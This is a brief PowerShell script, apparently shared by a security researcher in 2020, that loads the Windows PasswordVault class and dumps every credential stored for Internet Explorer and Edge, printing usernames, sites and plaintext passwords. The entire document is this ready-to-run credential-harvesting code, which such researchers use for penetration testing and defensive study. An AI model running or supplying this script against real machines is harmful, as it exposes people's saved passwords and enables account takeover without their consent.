# Content: Get the stored creds from Internet Explorer and Edge
# Author: Florian Hansemann | @CyberWarship | https://hansesecure.de
# Date: 09/2020

[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password
